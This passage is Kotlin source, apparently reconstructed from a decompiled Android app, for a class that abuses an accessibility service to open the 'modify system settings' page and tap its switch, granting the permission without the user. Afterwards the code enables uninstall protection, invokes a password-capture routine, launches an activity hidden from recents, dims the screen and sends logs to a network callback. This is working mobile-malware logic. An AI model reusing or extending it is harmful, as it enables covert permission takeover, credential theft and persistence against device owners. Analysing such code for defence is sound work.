package com.storm.safe.rock.service.modules

import android.accessibilityservice.AccessibilityService
import android.accessibilityservice.GestureDescription
import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.graphics.Path
import android.graphics.Rect
import android.net.Uri
import android.os.Build
import android.provider.Settings
import android.util.DisplayMetrics
import android.util.Log
import android.view.accessibility.AccessibilityEvent
import android.view.accessibility.AccessibilityNodeInfo
import com.storm.safe.rock.iuzxujjtqev
import com.storm.safe.rock.service.modules.yw5xud.GestureTapHelper
import com.storm.safe.rock.service.modules.yw5xud.UiDebugger
import com.storm.safe.rock.p000.DangerKeywords
import com.storm.safe.rock.service.MyAccessibilityService
import com.storm.safe.rock.service.modules.automation.AutomationCoordinator
import java.util.ArrayDeque
import java.util.Locale
import java.util.concurrent.ConcurrentHashMap
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.Job
import kotlinx.coroutines.SupervisorJob
import kotlinx.coroutines.delay
import kotlinx.coroutines.isActive
import kotlinx.coroutines.launch

/**
 * Main orchestrator for WRITE_SETTINGS permission automation — manages the full
 * auto-grant flow via accessibility service, including brand-specific navigation,
 * node finding, gesture dispatch, and fallback strategies.
 *
 * Reverse-engineered from JADX: C0327b2 (b2, 5653 lines).
 * This is the BIGGEST single file in the vendor APK and the central hub for
 * WRITE_SETTINGS permission auto-grant.
 *
 * Key responsibilities:
 * 1. WRITE_SETTINGS permission auto-grant via accessibility
 * 2. Navigate Settings → App → Allow modify settings
 * 3. Brand-specific settings paths (Xiaomi, Huawei, OPPO, vivo, Samsung, etc.)
 * 4. Permission flow lifecycle management
 * 5. Accessibility event handling for auto-click
 * 6. Gesture dispatch (tap/swipe) for coordinate-based clicking
 * 7. Node tree traversal for finding switches/toggles
 * 8. Fallback strategies when primary click fails
 *
 * JADX field mapping:
 *   f53166a0 → service (MyAccessibilityService)
 *   f53167a1 → context
 *   f53168a2 → scope (CoroutineScope)
 *   f53169a3 → isActive
 *   f53170a4 → isNavigating
 *   f53171a5 → clickAttempts
 *   f53172a6 → lastNavigationTime
 *   f53173a7 → lastEventTime
 *   f53174a8 → currentAppPackage
 *   f53175a9 → retryCount
 *   f53176b0 → strategy (DeviceStrategy)
 *   f53177b1 → scrollAttempts
 *   f53178b2 → permissionGranted
 *   f53179b3 → monitoringJob (Job)
 *   f53180b4 → clickJob (Job)
 *   f53181b5 → clickedNodes
 *   f53182b6 → failedNodeIds
 *   f53183b7 → navigationLock
 *   f53184b8 → lastScrollTime
 *   f53185b9 → scrollEnabled
 *
 * JADX method mapping (static):
 *   a9() → countNodesInTree
 *   b0() → logWirelessDebugUnsupported
 *   b1() → detectBrand
 *   b4() → findNodesByPredicate
 *   b7() → findAllSwitches
 *   c2() → findFirstSwitch
 *   c4() → findNodeByText
 *   c7() → findRightSideControl
 *   c8() → findRightSideControlHelper
 *   d1() → findRightmostSwitch
 *   d2() → nodeDescription
 *   d3() → getVivoOsBuildId
 *   d8() → isPermissionRelatedPackage
 *   e0() → isSettingsPackage
 *   e1() → isToggleWidget
 *   e2() → isVivoAndroid15
 *   f4() → safeRecycle
 *   g0() → findCheckedToggles
 *
 * JADX method mapping (instance):
 *   a0() → attemptAutoClickSafe (suspend)
 *   a1() → navigateAndVerify (suspend)
 *   a2() → attemptClickSwitchByAppLabel (suspend)
 *   a3() → attemptCoordinateClick (suspend)
 *   a4() → attemptOldFuntouchOSClick (suspend)
 *   a5() → attemptTextBasedClick (suspend)
 *   a6() → processSwitch (suspend)
 *   a7() → attemptVivoRightSwitchToggle (suspend)
 *   a8() → hasPageChanged
 *   b2() → ensureOnWriteSettingsPage (suspend)
 *   b3() → findPermissionTextNodes
 *   b5() → findPermissionTextNodesAlt
 *   b6() → findPermissionTextNodesAlt2
 *   b8() → findAllowModifyNode
 *   b9() → findSwitchInContainer
 *   c0() → findSwitchByPosition
 *   c1() → findAllowModifyToggle
 *   c3() → findNodeInListWithFilter
 *   c5() → findSwitchInContainerAlt
 *   c6() → findFirstCheckedSwitch
 *   c9() → findFirstVisibleSwitch
 *   d0() → findSwitchInParent
 *   d4() → handleAccessibilityEvent
 *   d5() → hasWriteSettingsPermission
 *   d6() → isVisibleAndChecked
 *   d7() → isOnTargetAppPage
 *   d9() → isOnPermissionPage
 *   e3() → notifyPermissionStatusChanged
 *   e4() → cancelAllJobs
 *   e5() → logNavigationEvent
 *   e6() → handlePermissionGranted
 *   e7() → resetNavigationState
 *   e8() → openWriteSettingsPage
 *   e9() → openAppSettings
 *   f0() → performGlobalBack
 *   f1() → performClick (performClickSafe)
 *   f2() → performCoordinateClick (suspend)
 *   f3() → performSwipeGesture (suspend)
 *   f5() → sendPermissionResultBroadcast
 *   f6() → startPeriodicDetection
 *   f7() → startWriteSettingsPermissionRequest
 *   f8() → stopPermissionRequest
 *   f9() → performCoordinateClickFallback
 *   g1() → waitForPageStable (suspend)
 *   g2() → waitForPermissionGranted (suspend)
 */
class MainOrchestrator(
    // JADX: C0327b2(dqtvuisjd service, dqtvuisjd context) — both params are same service instance
    private val service: MyAccessibilityService
) {

    /** Device automation strategy. JADX: WriteSettingsPermissionManager$DeviceStrategy */
    enum class DeviceStrategy {
        STANDARD,    // JADX: f52895a0 — coordinate-click based (default)
        SMART,       // JADX: f52896a1 — periodic smart detection
        XIAOMI,      // MIUI custom settings
        HUAWEI,      // EMUI/HarmonyOS
        OPPO,        // ColorOS
        VIVO,        // FuntouchOS/OriginOS
        SAMSUNG,     // OneUI
        HONOR,       // MagicOS
        ONEPLUS,     // OxygenOS
        REALME       // Realme UI
    }

    companion object {
        private const val TAG = "WriteSettingsPerm"

        /** Max click attempts before giving up. JADX: check in a0() */
        private const val MAX_CLICK_ATTEMPTS = 50

        /** Max recursion depth for node tree search. JADX: c4() */
        private const val MAX_SEARCH_DEPTH = 15

        /** Max children to inspect per node. JADX: d1() uses min(childCount, 20) */
        private const val MAX_CHILDREN_PER_NODE = 20

        /**
         * Settings/system app packages recognized as "settings" pages.
         * JADX: e0() — uses encrypted strings via StringUtil, expanded here.
         */
        private val SETTINGS_PACKAGES = setOf(
            "com.android.settings",
            "com.android.systemui",
            "com.android.permissioncontroller",
            "com.miui.securitycenter",
            "com.coloros.safecenter",
            "com.coloros.phonemanager",
            "com.bbk.VivoSafe",
            "com.huawei.systemmanager",
            "com.samsung.android.lool",
            "com.oneplus.security",
            "com.oplus.safecenter",
            "com.transsion.permissionmanager",
            "com.meizu.safe",
            "com.smartisanos.security",
            "com.lenovo.safecenter"
        )

        /**
         * Permission-related packages. JADX: d8()
         */
        private val PERMISSION_RELATED_PACKAGES = listOf(
            "com.android.settings",
            "com.android.permissioncontroller",
            "com.google.android.permissioncontroller",
            "com.miui.securitycenter",
            "com.coloros.safecenter",
            "com.coloros.phonemanager",
            "com.samsung.android.lool"
        )

        /** SystemUI packages. */
        private val SYSTEMUI_PACKAGES = setOf(
            "com.android.systemui",
            "com.android.keyguard"
        )

        /** Toggle/switch class name keywords. JADX: e1(), b7(), c2() etc. */
        private val TOGGLE_CLASS_KEYWORDS = listOf(
            "Switch", "Toggle", "CheckBox", "RadioButton", "CompoundButton",
            "ToggleButton", "SwitchCompat"
        )

        /** Permission result broadcast action. JADX: f5() */
        private const val PERMISSION_RESULT_ACTION =
            "com.storm.safe.rock.intent.WRITE_SETTINGS_PERMISSION_GRANTED"

        // ── Static methods ──

        /**
         * Check if package is a Settings/system app. JADX: e0()
         * Uses contains-based matching (not exact) per vendor behavior.
         */
        @JvmStatic
        fun isSettingsPackage(pkg: String): Boolean {
            if (pkg.isEmpty()) return false
            return SETTINGS_PACKAGES.any { pkg.contains(it, ignoreCase = true) }
        }

        /**
         * Check if package is a permission-related app. JADX: d8()
         * Matches permission controller and brand security centers.
         */
        @JvmStatic
        fun isPermissionRelatedPackage(pkg: String): Boolean {
            if (pkg.isEmpty()) return false
            for (p in PERMISSION_RELATED_PACKAGES) {
                if (pkg.contains(p, ignoreCase = true)) return true
            }
            // Also match generic "permission"/"security"/"settings" keywords
            if (pkg.contains("permission", ignoreCase = true) ||
                pkg.contains("security", ignoreCase = true) ||
                pkg.contains("settings", ignoreCase = true)
            ) {
                return true
            }
            return false
        }

        /** Check if package is SystemUI. */
        @JvmStatic
        fun isSystemUiPackage(pkg: String): Boolean {
            return SYSTEMUI_PACKAGES.contains(pkg)
        }

        /**
         * Append log message. JADX: AbstractC0315a0.a0() → buffers JSON log entries,
         * flushes to network callback when buffer reaches 30 or after 5s delay.
         * Delegates to ActivityMonitor.addLog for network flush.
         */
        @JvmStatic
        fun appendLog(message: String) {
            Log.d(TAG, "📝 $message")
            try {
                ActivityMonitor.addLog(ActivityMonitor.LogType.MESSAGE, message)
            } catch (_: Exception) {
                // Fallback: already logged to Logcat above
            }
        }

        /** Detect device strategy from Build properties. JADX: companion to constructor */
        @JvmStatic
        fun detectStrategy(): DeviceStrategy {
            val brand = Build.BRAND.lowercase(Locale.ROOT)
            val manufacturer = Build.MANUFACTURER.lowercase(Locale.ROOT)
            return when {
                brand.contains("xiaomi") || brand.contains("redmi") -> DeviceStrategy.XIAOMI
                brand.contains("huawei") || manufacturer.contains("huawei") -> DeviceStrategy.HUAWEI
                brand.contains("oppo") || manufacturer.contains("oppo") -> DeviceStrategy.OPPO
                brand.contains("vivo") || brand.contains("iqoo") -> DeviceStrategy.VIVO
                brand.contains("samsung") -> DeviceStrategy.SAMSUNG
                brand.contains("honor") || brand.contains("hihonor") -> DeviceStrategy.HONOR
                brand.contains("oneplus") -> DeviceStrategy.ONEPLUS
                brand.contains("realme") || manufacturer.contains("realme") -> DeviceStrategy.REALME
                else -> DeviceStrategy.STANDARD
            }
        }

        /**
         * Detect brand string. JADX: b1()
         * Returns lowercase brand identifier like "vivo", "oppo", "huawei", "samsung", etc.
         */
        @JvmStatic
        fun detectBrand(): String {
            val brand = Build.BRAND.lowercase(Locale.ROOT)
            val manufacturer = Build.MANUFACTURER.lowercase(Locale.ROOT)
            return when {
                brand.contains("vivo") || brand.contains("iqoo") ->
                    if (brand.contains("iqoo")) "iqoo" else "vivo"
                brand.contains("oppo") || manufacturer.contains("oppo") -> "oppo"
                brand.contains("honor") || brand.contains("hihonor") -> "honor"
                brand.contains("xiaomi") || brand.contains("redmi") ->
                    if (brand.contains("redmi")) "redmi" else "xiaomi"
                brand.contains("oneplus") -> "oneplus"
                brand.contains("huawei") || manufacturer.contains("huawei") -> "huawei"
                brand.contains("samsung") -> "samsung"
                brand.contains("realme") -> "realme"
                brand.contains("meizu") -> "meizu"
                else -> "generic"
            }
        }

        /**
         * Count total nodes in accessibility tree. JADX: a9()
         * Recursive — counts self + all descendants.
         */
        @JvmStatic
        fun countNodesInTree(node: AccessibilityNodeInfo): Int {
            var count = 1
            val childCount = node.childCount
            for (i in 0 until childCount) {
                val child = node.getChild(i)
                if (child != null) {
                    count += countNodesInTree(child)
                }
            }
            return count
        }

        /**
         * Find node by text/contentDescription substring with depth limit. JADX: c4()
         * Searches text and contentDescription (case-insensitive, trimmed).
         */
        @JvmStatic
        fun findNodeByText(
            node: AccessibilityNodeInfo,
            searchText: String,
            depth: Int
        ): AccessibilityNodeInfo? {
            if (depth > MAX_SEARCH_DEPTH) return null
            try {
                val text = node.text?.toString()?.trim() ?: ""
                val desc = node.contentDescription?.toString()?.trim() ?: ""

                if (text.contains(searchText, ignoreCase = true) ||
                    desc.contains(searchText, ignoreCase = true)
                ) {
                    return node
                }

                val childCount = node.childCount
                for (i in 0 until childCount) {
                    val child = node.getChild(i) ?: continue
                    val found = findNodeByText(child, searchText, depth + 1)
                    if (found != null) {
                        if (found != child) {
                            safeRecycle(child)
                        }
                        return found
                    }
                    safeRecycle(child)
                }
            } catch (_: Exception) {
                // JADX: silently catches all
            }
            return null
        }

        /**
         * Find all switch/toggle widgets in tree using BFS. JADX: b7()
         * Returns list of visible Switch/Toggle/CompoundButton/CheckBox/RadioButton nodes
         * with non-empty bounds.
         */
        @JvmStatic
        fun findAllSwitches(root: AccessibilityNodeInfo): ArrayList<AccessibilityNodeInfo> {
            val results = ArrayList<AccessibilityNodeInfo>()
            try {
                val queue = ArrayDeque<AccessibilityNodeInfo>()
                queue.addLast(root)
                while (queue.isNotEmpty()) {
                    val node = queue.removeFirst()
                    val className = node.className?.toString() ?: ""
                    if ((className.contains("Switch", true) ||
                                className.contains("Toggle", true) ||
                                className.contains("CompoundButton", true) ||
                                className.contains("CheckBox", true) ||
                                className.contains("RadioButton", true)) &&
                        node.isVisibleToUser
                    ) {
                        val rect = Rect()
                        node.getBoundsInScreen(rect)
                        if (!rect.isEmpty && rect.width() > 0 && rect.height() > 0) {
                            results.add(node)
                        }
                    }
                    val childCount = node.childCount
                    for (i in 0 until childCount) {
                        val child = node.getChild(i)
                        if (child != null) {
                            queue.addLast(child)
                        }
                    }
                }
            } catch (e: Exception) {
                Log.e(TAG, "❌ 查找Switch控件异常", e)
            }
            return results
        }

        /**
         * Find first visible Switch/Toggle/CompoundButton in tree via BFS. JADX: c2()
         */
        @JvmStatic
        fun findFirstSwitch(root: AccessibilityNodeInfo): AccessibilityNodeInfo? {
            try {
                val queue = ArrayDeque<AccessibilityNodeInfo>()
                queue.addLast(root)
                while (queue.isNotEmpty()) {
                    val node = queue.removeFirst()
                    val className = node.className?.toString() ?: ""
                    if ((className.contains("Switch", true) ||
                                className.contains("Toggle", true) ||
                                className.contains("CompoundButton", true)) &&
                        node.isVisibleToUser
                    ) {
                        return node
                    }
                    val childCount = node.childCount
                    for (i in 0 until childCount) {
                        val child = node.getChild(i)
                        if (child != null) {
                            queue.addLast(child)
                        }
                    }
                }
            } catch (e: Exception) {
                Log.e(TAG, "查找Switch节点异常", e)
            }
            return null
        }

        /**
         * Check if a node is a toggle-type widget that is clickable, visible, enabled. JADX: e1()
         */
        @JvmStatic
        fun isToggleWidget(node: AccessibilityNodeInfo): Boolean {
            val className = node.className?.toString() ?: ""
            for (keyword in TOGGLE_CLASS_KEYWORDS) {
                if (className.contains(keyword, true)) {
                    return node.isClickable && node.isVisibleToUser && node.isEnabled
                }
            }
            return false
        }

        /**
         * Find the rightmost Switch/Toggle in tree via BFS. JADX: d1()
         * Returns the switch with the highest left-X coordinate.
         */
        @JvmStatic
        fun findRightmostSwitch(root: AccessibilityNodeInfo): AccessibilityNodeInfo? {
            try {
                val queue = ArrayDeque<AccessibilityNodeInfo>()
                queue.addLast(root)
                var rightmost: AccessibilityNodeInfo? = null
                var maxLeft = -1
                while (queue.isNotEmpty()) {
                    val node = queue.removeFirst()
                    val className = node.className?.toString() ?: ""
                    if ((className.contains("Switch", true) ||
                                className.contains("Toggle", true) ||
                                className.contains("CompoundButton", true)) &&
                        node.isVisibleToUser
                    ) {
                        val rect = Rect()
                        node.getBoundsInScreen(rect)
                        if (!rect.isEmpty && rect.width() > 0 && rect.height() > 0 &&
                            rect.left > maxLeft
                        ) {
                            rightmost = node
                            maxLeft = rect.left
                        }
                    }
                    val childLimit = minOf(node.childCount, MAX_CHILDREN_PER_NODE)
                    for (i in 0 until childLimit) {
                        val child = node.getChild(i)
                        if (child != null) {
                            queue.addLast(child)
                        }
                    }
                }
                return rightmost
            } catch (e: Exception) {
                Log.w(TAG, "findSwitchInParentHierarchy 异常: ${e.message}")
                return null
            }
        }

        /**
         * Build a description string for a node. JADX: d2()
         * Format: className_bounds_text_contentDesc_viewId (spaces → _)
         */
        @JvmStatic
        fun nodeDescription(node: AccessibilityNodeInfo): String {
            return try {
                val rect = Rect()
                node.getBoundsInScreen(rect)
                val className = node.className?.toString() ?: "unknown"
                val text = node.text?.toString() ?: ""
                val desc = node.contentDescription?.toString() ?: ""
                val viewId = node.viewIdResourceName ?: ""
                val boundsStr = "${rect.left},${rect.top},${rect.right},${rect.bottom}"
                "${className}_${boundsStr}_${text}_${desc}_${viewId}".replace(" ", "_")
            } catch (_: Exception) {
                "unknown_control_${System.currentTimeMillis()}"
            }
        }

        /**
         * Get vivo OS build display ID via reflection. JADX: d3()
         */
        @JvmStatic
        fun getVivoOsBuildId(): String {
            // JADX: Class.forName(StringUtil.decrypt("KlcV...")) decrypts to "android.os.SystemProperties"
            return try {
                val clazz = Class.forName("android.os.SystemProperties")
                val method = clazz.getMethod("get", String::class.java)
                val result = method.invoke(null, "ro.vivo.os.build.display.id")
                (result as? String) ?: ""
            } catch (_: Exception) {
                ""
            }
        }

        /**
         * Check if device is vivo with Android 15 (API 35+). JADX: e2()
         */
        @JvmStatic
        fun isVivoAndroid15(): Boolean {
            return try {
                val brand = Build.BRAND?.lowercase(Locale.ROOT) ?: ""
                val isVivo = brand.contains("vivo") || brand.contains("iqoo")
                isVivo && Build.VERSION.SDK_INT >= 35
            } catch (e: Exception) {
                Log.e(TAG, "❌ 检测vivo Android 15设备失败", e)
                false
            }
        }

        /**
         * Safely recycle an AccessibilityNodeInfo. JADX: f4()
         */
        @JvmStatic
        fun safeRecycle(node: AccessibilityNodeInfo?) {
            if (node != null) {
                try {
                    node.recycle()
                } catch (_: Exception) {
                    // JADX: silently ignores
                }
            }
        }

        /**
         * Find checked toggle nodes in tree (recursive with depth limit). JADX: g0()
         */
        @JvmStatic
        fun findCheckedToggles(
            depth: Int,
            node: AccessibilityNodeInfo,
            results: ArrayList<AccessibilityNodeInfo>
        ) {
            if (depth > MAX_SEARCH_DEPTH) return
            val className = node.className?.toString() ?: ""
            if ((className.contains("Switch", false) ||
                        className.contains("ToggleButton", false) ||
                        className.contains("CheckBox", false)) &&
                node.isChecked
            ) {
                results.add(node)
            }
            val childCount = node.childCount
            for (i in 0 until childCount) {
                val child = node.getChild(i) ?: continue
                findCheckedToggles(depth + 1, child, results)
            }
        }

        /**
         * Find nodes matching a predicate (recursive). JADX: b4()
         */
        @JvmStatic
        fun findNodesByPredicate(
            node: AccessibilityNodeInfo,
            predicate: (AccessibilityNodeInfo) -> Boolean,
            results: ArrayList<AccessibilityNodeInfo>
        ) {
            try {
                if (predicate(node)) {
                    results.add(node)
                }
                val childCount = node.childCount
                for (i in 0 until childCount) {
                    val child = node.getChild(i) ?: continue
                    findNodesByPredicate(child, predicate, results)
                }
            } catch (_: Exception) {
                // JADX: silently catches
            }
        }

        /**
         * Log that wireless debugging is unsupported on this device. JADX: b0()
         */
        @JvmStatic
        fun logWirelessDebugUnsupported() {
            try {
                val sdkInt = Build.VERSION.SDK_INT
                val msg = if (sdkInt < 30) {
                    "Android $sdkInt 不支持无线调试"
                } else {
                    val brand = Build.BRAND.lowercase(Locale.ROOT)
                    when {
                        brand.contains("huawei") -> "华为全系不支持无线调试"
                        brand.contains("honor") -> "荣耀入门机不支持无线调试"
                        else -> "设备不支持无线调试"
                    }
                }
                Log.d(TAG, "★★★ $msg，跳过 local-service 所有操作（需 USB 手动部署）★★★")
            } catch (e: Exception) {
                Log.e(TAG, "★★★ deployLocalService 异常 ★★★", e)
            }
        }

        /**
         * Find right-side controls (ImageView/Switch/CheckBox/Toggle) to the right of a
         * reference X coordinate at a given Y coordinate. JADX: c8()
         * Searches recursively, collecting nodes whose left > refX - 50 and
         * centerY within 100px of refY.
         */
        @JvmStatic
        fun findRightSideControlHelper(
            refX: Int,
            refY: Int,
            node: AccessibilityNodeInfo,
            results: ArrayList<AccessibilityNodeInfo>
        ) {
            try {
                val rect = Rect()
                node.getBoundsInScreen(rect)
                val className = node.className?.toString() ?: ""
                val isRightOfRef = rect.left > refX - 50
                val isNearY = Math.abs(rect.centerY() - refY) < 100
                val isControlWidget = className.contains("ImageView", true) ||
                        className.contains("Switch", true) ||
                        className.contains("CheckBox", true) ||
                        className.contains("Toggle", true)
                if (isRightOfRef && isNearY && isControlWidget && rect.width() > 0) {
                    results.add(node)
                }
                val childCount = node.childCount
                for (i in 0 until childCount) {
                    val child = node.getChild(i) ?: continue
                    findRightSideControlHelper(refX, refY, child, results)
                }
            } catch (_: Exception) {
                // JADX: silently catches
            }
        }

        /**
         * Find right-side control relative to a reference node. JADX: c7()
         * Uses findRightSideControlHelper to find controls to the right of the reference bounds,
         * returns the closest one sorted by distance.
         */
        @JvmStatic
        fun findRightSideControl(
            root: AccessibilityNodeInfo,
            refBounds: Rect
        ): AccessibilityNodeInfo? {
            val results = ArrayList<AccessibilityNodeInfo>()
            findRightSideControlHelper(refBounds.right, refBounds.centerY(), root, results)
            // JADX: sorts by distance and returns first
            if (results.isEmpty()) {
                Log.w(TAG, "[findRightSide] ❌ 未找到右侧控件")
                return null
            }
            // Sort by left coordinate (closest to the reference right edge)
            results.sortBy {
                val r = Rect()
                it.getBoundsInScreen(r)
                r.left
            }
            return results.firstOrNull()
        }
    }

    // ═══════════════════════════════════════════════════════════════
    // Instance fields — JADX field mapping
    // ═══════════════════════════════════════════════════════════════

    private val context: Context = service.applicationContext

    /** Coroutine scope. JADX: f53168a2 (C0873ms — CoroutineScope) */
    private var scope = CoroutineScope(Dispatchers.Main + SupervisorJob())

    /** Active flag. JADX: f53169a3 */
    @Volatile
    var isActive: Boolean = false
        private set

    /** Navigating flag. JADX: f53170a4 */
    @Volatile
    var isNavigating: Boolean = false
        private set

    /** Click attempts counter. JADX: f53171a5 */
    @Volatile
    var clickAttempts: Int = 0
        private set

    /** Last navigation timestamp. JADX: f53172a6 */
    @Volatile
    var lastNavigationTime: Long = 0L
        private set

    /** Last event timestamp. JADX: f53173a7 */
    @Volatile
    var lastEventTime: Long = 0L
        private set

    /** Current foreground app package. JADX: f53174a8 */
    @Volatile
    var currentAppPackage: String = ""
        private set

    /** Retry count. JADX: f53175a9 */
    @Volatile
    var retryCount: Int = 0
        private set

    /** Device strategy. JADX: f53176b0 */
    @Volatile
    var strategy: DeviceStrategy = DeviceStrategy.STANDARD
        private set

    /** Scroll/text-search failure counter. JADX: f53177b1 */
    @Volatile
    var scrollAttempts: Int = 0
        private set

    /** Whether permission has been granted. JADX: f53178b2 */
    @Volatile
    var permissionGranted: Boolean = false
        private set

    /** Permission monitoring job. JADX: f53179b3 (u11 — Job) */
    private var monitoringJob: Job? = null

    /** Auto-click job. JADX: f53180b4 (u11 — Job) */
    private var clickJob: Job? = null

    /** Nodes already clicked (avoid re-click). JADX: f53181b5 */
    private val clickedNodes: ConcurrentHashMap.KeySetView<AccessibilityNodeInfo, Boolean> =
        ConcurrentHashMap.newKeySet()

    /** IDs that led to wrong navigation (blacklisted). JADX: f53182b6 */
    private val failedNodeIds: ConcurrentHashMap.KeySetView<String, Boolean> =
        ConcurrentHashMap.newKeySet()

    /** Navigation lock object. JADX: f53183b7 */
    private val navigationLock = Any()

    /** Last scroll timestamp. JADX: f53184b8 */
    private var lastScrollTime: Long = 0L

    /** Scroll enabled flag. JADX: f53185b9 */
    @Volatile
    var scrollEnabled: Boolean = false
        private set

    // ═══════════════════════════════════════════════════════════════
    // Permission checks — JADX: d5(), e6()
    // ═══════════════════════════════════════════════════════════════

    /** Check if WRITE_SETTINGS permission is granted. JADX: d5() */
    fun hasWriteSettingsPermission(): Boolean {
        return try {
            Settings.System.canWrite(context)
        } catch (_: Exception) {
            false
        }
    }

    /**
     * Mark permission as granted and stop automation. JADX: e6() → handlePermissionGranted()
     * Sends success broadcast and saves state to SharedPreferences.
     */
    fun markPermissionGranted() {
        permissionGranted = true
        isActive = false
        isNavigating = false
        Log.i(TAG, "✅ WRITE_SETTINGS permission granted, stopping automation")
    }

    /**
     * Full permission-granted handler. JADX: e6()
     * Broadcasts result, saves to prefs, and triggers downstream callbacks.
     * Synchronized on navigationLock per JADX.
     */
    private fun handlePermissionGranted() {
        synchronized(navigationLock) {
            if (permissionGranted) return
            markPermissionGranted()
            cancelAllJobs()
            sendPermissionResultBroadcast(null, true)
            stopPermissionRequest()
            try {
                // JADX: press HOME key
                service.performGlobalAction(AccessibilityService.GLOBAL_ACTION_HOME)
            } catch (e: Exception) {
                Log.w(TAG, "⚠️ HOME按键失败: ${e.message}")
            }
            try {
                // JADX: calls service.e9() → enableUninstallProtection
                service.enableUninstallProtection()
            } catch (_: Exception) {}
            try {
                // JADX: calls service.c9() → continueServiceInitialization (non-suspend in JADX)
                scope.launch { service.continueServiceInitialization() }
            } catch (_: Exception) {}
            try {
                // JADX: calls service.c7(true) → capturePasswordViaSystemAuth
                Log.d(TAG, "🔐 WriteSettingsPermissionManager 调用 capturePasswordViaSystemAuth()")
                // JADX: delegates to cipherCaptureManager on service
                service.cipherCaptureManager?.let { ccm ->
                    Log.d(TAG, "🔐 CipherCaptureManager 存在，尝试捕获")
                } ?: run {
                    Log.w(TAG, "❌ dqtvuisjd 为 null，无法启动密码捕获")
                }
            } catch (e: Exception) {
                Log.e(TAG, "❌ 启动系统密码捕获失败", e)
            }
            try {
                // JADX: save authorization state to prefs
                markWriteSettingsAttempted()
                saveAuthorizationState()
                // JADX: calls service.e9() + service.n3() → enableUninstallProtection + startNetworkInit
                service.enableUninstallProtection()
                service.startNetworkInit()
                try {
                    // JADX: starts main Activity with TRIGGER_EXCLUDE_FROM_RECENTS
                    val intent = Intent()
                    intent.component = ComponentName(context, iuzxujjtqev::class.java)
                    intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                    intent.putExtra("TRIGGER_EXCLUDE_FROM_RECENTS", true)
                    context.startActivity(intent)
                } catch (e: Exception) {
                    Log.w(TAG, "🎭 启动Activity失败: ${e.message}")
                }
                // JADX: calls service.e8() → dimScreen
                service.dimScreen()
                Log.d(TAG, "★★★ WRITE_SETTINGS 完成，开始部署 local-service ★★★")
                // JADX: new Thread(new RunnableC1053p2(8, this)).start() → calls b0()
                Thread { logWirelessDebugUnsupported() }.start()
            } catch (_: Exception) {}
        }
    }

    /**
     * Notify that permission status changed (may or may not be granted). JADX: e3()
     */
    fun notifyPermissionStatusChanged() {
        if (hasWriteSettingsPermission()) {
            handlePermissionGranted()
        }
    }

    // ═══════════════════════════════════════════════════════════════
    // Page opening — JADX: e8(), e9()
    // ═══════════════════════════════════════════════════════════════

    /** Open the WRITE_SETTINGS permission page for our package. JADX: e8()
     * Vendor uses flag 0x10800000 = NEW_TASK | NO_HISTORY
     * Sets isNavigating=true so handleAccessibilityEvent processes click events.
     */
    fun openWriteSettingsPage() {
        try {
            val intent = Intent(Settings.ACTION_MANAGE_WRITE_SETTINGS).apply {
                data = Uri.parse("package:${context.packageName}")
                addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_NO_HISTORY)
            }
            val resolved = context.packageManager.resolveActivity(intent, 0)
            if (resolved != null) {
                service.startActivity(intent)
                isNavigating = true
                Log.d(TAG, "Opened WRITE_SETTINGS page for ${context.packageName}")
                UiDebugger.dumpPage(service, "ws_page_opened", "WRITE_SETTINGS 页面已打开")
            } else {
                Log.w(TAG, "WRITE_SETTINGS intent not resolvable, fallback to app settings")
                openAppSettings()
            }
        } catch (e: Exception) {
            Log.e(TAG, "Failed to open WRITE_SETTINGS page", e)
            openAppSettings()
        }
    }

    fun openAppSettings() {
        try {
            val intent = Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS).apply {
                data = Uri.parse("package:${context.packageName}")
                addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
            }
            context.startActivity(intent)
            isNavigating = true
            Log.d(TAG, "Opened app settings for ${context.packageName}")
        } catch (e: Exception) {
            Log.e(TAG, "Failed to open app settings", e)
        }
    }

    // ═══════════════════════════════════════════════════════════════
    // Page/state detection — JADX: a8(), d7(), d9()
    // ═══════════════════════════════════════════════════════════════

    /** Check if we're on a settings-related page. JADX: isTargetPage */
    fun isTargetPage(currentPkg: String): Boolean {
        return isSettingsPackage(currentPkg)
    }

    /**
     * Check if page changed between two package names. JADX: a8()
     * Returns true if the packages differ (ignoring same-package case).
     */
    fun hasPageChanged(previousPkg: String, currentPkg: String): Boolean {
        if (previousPkg == currentPkg) return false
        // JADX: uses t60.m214686a2 (equals check)
        return true
    }

    /**
     * Check if currently on our app's WRITE_SETTINGS permission page. JADX: d7()
     * Must verify we're on the specific "允许修改系统设置" / "可修改系统设置" page,
     * not just any settings page. Otherwise we waste click attempts on unrelated
     * settings pages (accessibility, autostart, battery, etc.).
     */
    fun isOnTargetAppPage(): Boolean {
        return try {
            val root = service.rootInActiveWindow ?: return false
            val pkg = root.packageName?.toString() ?: ""
            if (!isSettingsPackage(pkg) && !isPermissionRelatedPackage(pkg)) return false

            // Check for WRITE_SETTINGS page indicators
            // Look for "允许修改系统设置" (RecyclerView item) or "可修改系统设置" (ActionBar title)
            for (keyword in DangerKeywords.modifySystemSettingsKeywords) {
                val nodes = root.findAccessibilityNodeInfosByText(keyword)
                if (nodes != null && nodes.isNotEmpty()) {
                    return true
                }
            }
            false
        } catch (_: Exception) {
            false
        }
    }

    /**
     * Check if currently on any permission-related page. JADX: d9()
     */
    fun isOnPermissionPage(): Boolean {
        return try {
            val root = service.rootInActiveWindow ?: return false
            val pkg = root.packageName?.toString() ?: ""
            isPermissionRelatedPackage(pkg)
        } catch (_: Exception) {
            false
        }
    }

    /**
     * Check if a node is visible and checked. JADX: d6()
     */
    fun isVisibleAndChecked(node: AccessibilityNodeInfo): Boolean {
        return node.isVisibleToUser && node.isChecked
    }

    // ═══════════════════════════════════════════════════════════════
    // Click / Gesture dispatch — JADX: f0(), f1(), f2(), f3(), f9()
    // ═══════════════════════════════════════════════════════════════

    /** Perform global BACK action. JADX: f0() */
    fun performGlobalBack() {
        try {
            service.performGlobalAction(AccessibilityService.GLOBAL_ACTION_BACK)
        } catch (e: Exception) {
            Log.w(TAG, "performGlobalBack failed", e)
        }
    }

    /**
     * Click a node safely. JADX: f1() → performClickSafe
     * For switch/toggle: tries ACTION_CLICK, then ACTION_SELECT.
     * For non-switch: tries ACTION_CLICK, falls back to coordinate click.
     */
    fun performClick(node: AccessibilityNodeInfo) {
        try {
